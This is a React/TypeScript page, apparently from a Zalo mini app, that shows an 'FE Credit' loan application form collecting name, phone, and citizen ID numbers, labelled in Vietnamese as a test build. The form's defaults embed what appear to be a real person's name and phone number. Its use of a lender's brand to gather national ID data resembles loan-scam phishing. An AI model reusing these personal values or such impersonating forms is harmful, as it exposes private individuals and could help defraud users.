// src/pages/LoanInfo.tsx
import { Page, Text, Input, Button, Box, Checkbox, Slider } from 'zmp-ui';
import { useNavigate } from 'react-router-dom';
import { useState, useEffect } from 'react';

export default function LoanInfo() {
  const navigate = useNavigate();

  // Dễ test: cho phép nhập tay tên + sđt
  const [name, setName] = useState('Nguyễn Mạnh Cường');
  const [phone, setPhone] = useState('0378460679');
  const [cccd, setCccd] = useState('');
  const [cmndOld, setCmndOld] = useState('');
  const [insurance, setInsurance] = useState(false);
  const [amount, setAmount] = useState(10000000);
  const [term, setTerm] = useState(6);

  // Vẫn cố lấy từ Zalo nếu có (fallback)
  useEffect(() => {
    if ((window as any).zmp) {
      (window as any).zmp.getUserInfo({
        success: (res: any) => {
          const { userInfo } = res;
          if (userInfo.name) setName(userInfo.name);
          if (userInfo.phone) setPhone(userInfo.phone);
        }
      });
    }
  }, []);

  const monthlyPayment = () => {
    const rate = 0.0325;
    const principal = amount;
    const months = term;
    const monthly = principal * rate + principal / months;
    return Math.round(monthly / 1000) * 1000;
  };

  const formatVND = (num: number) => num.toLocaleString('vi-VN');

  const next = () => {
    const data = {
      name,
      phone,
      cccd,
      cmndOld: cmndOld || 'Không có',
      amount: `${formatVND(amount)} VND`,
      term: `${term} tháng`,
      rate: '3.25%',
      monthly: `${formatVND(monthlyPayment())} đ`,
      insurance
    };
    sessionStorage.setItem('loanData', JSON.stringify(data));
    navigate('/confirm');
  };

  return (
    <Page className="bg-white">
      <div className="bg-green-600 text-white text-center py-4">
        <Text className="text-xl font-bold">FE Credit</Text>
      </div>

      <Box className="px-6 pt-6">
        {/* Gói vay */}
        <div className="bg-green-600 text-white rounded-2xl p-6 mb-6 text-center">
          <Text className="text-lg">Lãi suất từ: 3.25%/tháng</Text>
          <Text className="text-lg underline">Tìm hiểu thêm</Text>
          <Text className="text-3xl font-bold mt-3">
            Mỗi tháng trả: {formatVND(monthlyPayment())} đ
          </Text>
        </div>

        <div className="flex items-center mb-6">
          <Checkbox
            value="insurance"
            checked={insurance}
            onChange={(e: any) => setInsurance(e.target.checked)}
          />
          <Text className="ml-3">Bảo hiểm khoản vay</Text>
        </div>

        <Text className="text-xl font-bold mb-4">Thông tin người vay</Text>
        <Text className="text-sm text-gray-500 mb-6">
          Điền đầy đủ để test
        </Text>

        {/* BỎ disabled, CHO NHẬP TAY */}
        <Input
          label="Họ tên đầy đủ"
          value={name}
          onChange={(e: any) => setName(e.target.value)}
          placeholder="Nguyễn Văn A"
          className="mb-4"
        />
        <Input
          label="Số điện thoại"
          value={phone}
          onChange={(e: any) => setPhone(e.target.value)}
          placeholder="0901234567"
          className="mb-4"
        />
        <Input
          label="Số CCCD"
          value={cccd}
          onChange={(e: any) => setCccd(e.target.value)}
          placeholder="025205009716"
          className="mb-4"
        />
        <Input
          label="Số CMND cũ (nếu có)"
          value={cmndOld}
          onChange={(e: any) => setCmndOld(e.target.value)}
          placeholder="Ví dụ: 025123456"
          className="mb-6"
        />

        {/* Slider */}
        <Text className="font-bold mb-2">Số tiền cần vay</Text>
        <div className="mb-6">
          <Slider
            min={5000000}
            max={50000000}
            step={1000000}
            value={amount}
            onChange={(value: number | [number, number]) => {
              const val = Array.isArray(value) ? value[0] : value;
              setAmount(val);
            }}
            label={`${formatVND(amount)} VND`}
          />
        </div>

        <Text className="font-bold mb-2">Kỳ hạn vay</Text>
        <div className="mb-8">
          <Slider
            min={3}
            max={36}
            step={3}
            value={term}
            onChange={(value: number | [number, number]) => {
              const val = Array.isArray(value) ? value[0] : value;
              setTerm(val);
            }}
            label={`${term} tháng`}
          />
        </div>

        <div className="bg-blue-50 rounded-xl p-4 flex mb-8 items-start">
          <Text className="text-2xl mr-3">Info</Text>
          <Text className="text-sm flex-1">
            Đây là bản test – bạn có thể nhập gì cũng được
          </Text>
        </div>

        <Button
          className="w-full bg-green-600 text-white font-bold text-lg rounded-full"
          size="large"
          onClick={next}
          disabled={!name || !phone || !cccd || cccd.length !== 12}
        >
          Tiếp theo
        </Button>
      </Box>
    </Page>
  );
}